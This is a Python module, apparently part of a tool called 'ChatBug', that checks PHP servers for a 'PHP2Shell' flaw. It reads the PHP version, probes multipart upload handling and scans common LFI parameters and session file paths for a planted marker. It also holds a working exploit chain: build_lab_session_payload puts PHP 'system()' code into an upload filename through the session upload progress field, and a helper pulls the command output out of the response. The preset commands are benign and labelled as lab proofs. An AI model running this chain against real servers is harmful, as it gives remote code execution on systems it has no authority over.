"""Reusable, importable PHP2Shell exposure and lab proof operations."""

from __future__ import annotations

import json
import re
import secrets
import urllib.error
import urllib.parse
import urllib.request
from typing import Any

FIXED: dict[tuple[int, int], int] = {(8,2):35,(8,3):36,(8,4):27,(8,5):12}
UPLOAD_FIELD = "PHP_SESSION_UPLOAD_PROGRESS"
COMMON_LFI_PARAMS = ("page", "file", "include", "path")
COMMON_SESSION_PATHS = ("/tmp/sessions/sess_{sid}","/tmp/sess_{sid}","/var/lib/php/sessions/sess_{sid}","/var/lib/php/session/sess_{sid}","/run/php/sess_{sid}")
LAB_PROOF_COMMANDS = {"list-tmp":"ls -la /tmp","cat-marker":"cat /tmp/chatbug-marker.txt","list-and-marker":"ls -la /tmp; echo MARKER; cat /tmp/chatbug-marker.txt"}


def random_marker(prefix: str = "CHATBUG_MARKER") -> str:
    return f"{prefix}_{secrets.token_hex(8)}".upper()


def http_request(url, *, method="GET", headers=None, data=None, timeout=12):
    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *args: Any, **kwargs: Any) -> None:
            return None
    opener = urllib.request.build_opener(NoRedirect)
    request = urllib.request.Request(url, data=data, method=method, headers=headers or {})
    try:
        with opener.open(request, timeout=timeout) as response:
            return response.status, dict(response.headers), response.read(65536)
    except urllib.error.HTTPError as exc:
        return exc.code, dict(exc.headers), exc.read(65536)
    except Exception as exc:
        return 0, {}, str(exc).encode()


def parse_php_version(headers):
    values = [v for k, v in headers.items() if k.lower() in {"server", "x-powered-by"}]
    for value in values:
        m = re.search(r"PHP/(\d+)\.(\d+)\.(\d+)", value, re.I)
        if m:
            return tuple(map(int, m.groups())), value
    return None, "; ".join(values)


def classify_version(version):
    if version is None:
        return {"status":"unknown","code":None,"reason":"PHP version header not found"}
    major, minor, patch = version
    key = (major, minor)
    if key in FIXED:
        fixed = FIXED[key]
        return {"status":"fixed" if patch >= fixed else "vulnerable","code":f"PHP/{major}.{minor}.{patch}","reason":f"first fixed release is {major}.{minor}.{fixed}"}
    if major < 8 or key == (8,1):
        return {"status":"vulnerable","code":f"PHP/{major}.{minor}.{patch}","reason":"EOL branch for this CVE set; no ordinary supported fixed release"}
    return {"status":"unknown","code":f"PHP/{major}.{minor}.{patch}","reason":"branch outside checker table"}


def _multipart(body, sid, boundary):
    encoded = body.encode("latin-1", errors="replace")
    return {"Content-Type":f"multipart/form-data; boundary={boundary}","Cookie":f"PHPSESSID={sid}","Connection":"close","Content-Length":str(len(encoded))}, encoded


def build_safe_multipart_probe(marker):
    boundary = "----chatbug-safe-boundary"
    sid = "chatbug" + secrets.token_hex(12)
    filename = f"<?php echo '{marker}';?>.txt"
    body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"{UPLOAD_FIELD}\"\r\n\r\n{marker}\r\n"
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"safe_file\"; filename=\"{filename}\"\r\nContent-Type: text/plain\r\n\r\nchatbug safe marker probe\r\n"
            f"--{boundary}--\r\n")
    headers, encoded = _multipart(body, sid, boundary)
    headers["User-Agent"] = "ChatBug-PHP2Shell-Safe-Check/0.1"
    return headers, encoded, sid


def scan_common_lfi(url, sid, marker, *, timeout=12):
    results=[]
    for template in COMMON_SESSION_PATHS:
        session_path=template.format(sid=sid)
        encoded=urllib.parse.quote(session_path, safe="")
        for param in COMMON_LFI_PARAMS:
            candidate=urllib.parse.urljoin(url, f"/?{param}={encoded}")
            status,_,body=http_request(candidate, timeout=timeout)
            text=body.decode("latin-1", errors="replace")
            results.append({"kind":"lfi_candidate","url":candidate,"http_status":status,"marker_returned":marker in text,"body_prefix":text[:160]})
            if marker in text: return results
    for suffix in (f"/index.php/../../../../tmp/sessions/sess_{sid}","/index.php/../../../../tmp/chatbug-negative-probe.txt"):
        candidate=urllib.parse.urljoin(url, suffix)
        status,_,body=http_request(candidate, timeout=timeout)
        text=body.decode("latin-1", errors="replace")
        results.append({"kind":"path_traversal_control","url":candidate,"http_status":status,"marker_returned":marker in text,"body_prefix":text[:160]})
    return results


def safe_url_check(url, *, include_multipart=True, include_gadgets=True):
    marker=random_marker()
    head_status, head_headers, _ = http_request(url, method="HEAD")
    version, raw_header = parse_php_version(head_headers)
    version_result = classify_version(version)
    findings=[{"name":"http_route","status":"reachable" if 200 <= head_status < 500 else "unreachable","evidence":f"HTTP {head_status}; {raw_header}"},{"name":"php_version",**version_result}]
    multipart=None; gadget_results=[]
    if include_multipart:
        headers, body, sid = build_safe_multipart_probe(marker)
        post_status, post_headers, post_body = http_request(url, method="POST", headers=headers, data=body)
        multipart={"http_status":post_status,"set_cookie_present":any(k.lower()=="set-cookie" for k in post_headers),"sid":sid,"body_prefix":post_body.decode("latin-1",errors="replace")[:160]}
        findings.append({"name":"pre_auth_multipart_parser","status":"reachable" if 200 <= post_status < 500 else "unknown","evidence":f"ordinary multipart POST returned HTTP {post_status}; parser reachability only, not RCE"})
        if include_gadgets:
            gadget_results=scan_common_lfi(url,sid,marker)
            hits=[x for x in gadget_results if x["marker_returned"]]
            findings.append({"name":"common_lfi_marker_read","status":"marker_returned" if hits else "not_proven","evidence":f"marker returned by {len(hits)} common LFI/traversal candidates" if hits else "marker not returned by fixed common LFI/traversal candidates"})
    proven=any(f["name"]=="common_lfi_marker_read" and f["status"]=="marker_returned" for f in findings)
    return {"schema":"chatbug.php2shell.web_check/v1","target":url,"verdict":"vulnerable_version_exposed" if version_result["status"]=="vulnerable" else "inconclusive","evidence_tier":"tier_3_gadget_found" if proven else "tier_2_parser_reachable","rce_or_file_read_proven":proven,"meaning":"This check never sends OOM/UAF payloads and does not execute commands on the target.","findings":findings,"multipart":multipart,"gadget_scan":gadget_results}


def lab_proof_command(proof):
    try: return LAB_PROOF_COMMANDS[proof]
    except KeyError as exc: raise ValueError(f"unknown proof {proof!r}; choose one of: {', '.join(sorted(LAB_PROOF_COMMANDS))}") from exc


def build_lab_session_payload(sid, proof):
    command=lab_proof_command(proof)
    boundary="----chatbug-lab-boundary"
    php_code=f"<?php echo '___START___'; system('{command}'); echo '___END___';?>"
    body=(f"--{boundary}\r\nContent-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n{sid}\r\n"
          f"--{boundary}\r\nContent-Disposition: form-data; name=\"{UPLOAD_FIELD}\"\r\n\r\nx\r\n"
          f"--{boundary}\r\nContent-Disposition: form-data; name=\"f\"; filename=\"{php_code}\"\r\n\r\nZ\r\n"
          f"--{boundary}--\r\n")
    return _multipart(body, sid, boundary)


def extract_command_output(response_body):
    match = re.search(rb"___START___(.*?)___END___", response_body, re.S)
    return match.group(1).decode("latin-1", errors="replace").strip() if match else None


def json_dumps(value): return json.dumps(value, ensure_ascii=False, indent=2, sort_keys=True)
